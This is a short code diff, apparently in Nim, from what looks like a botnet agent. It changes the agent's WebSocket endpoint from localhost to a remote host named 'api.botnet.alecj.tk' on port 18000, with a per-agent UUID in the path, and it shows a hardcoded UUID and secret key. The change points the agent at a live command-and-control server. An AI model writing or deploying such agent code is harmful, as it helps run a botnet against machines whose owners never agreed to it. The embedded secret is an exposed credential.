@@ -16,7 +16,7 @@ const UUID = "fe09423a-c414-4c09-b46c-2325296e692b"
 
 const SECRET = "cxUjBjwDaBDiCQk3l9AW9BT4UE5ROK6fEpxL1qVQkxQ"
 
-const WS_URL = fmt"ws://127.0.0.1:8000/agent/{UUID}/ws"
+const WS_URL = fmt"ws://api.botnet.alecj.tk:18000/agent/{UUID}/ws"
 
 var PLATFORM: string
 
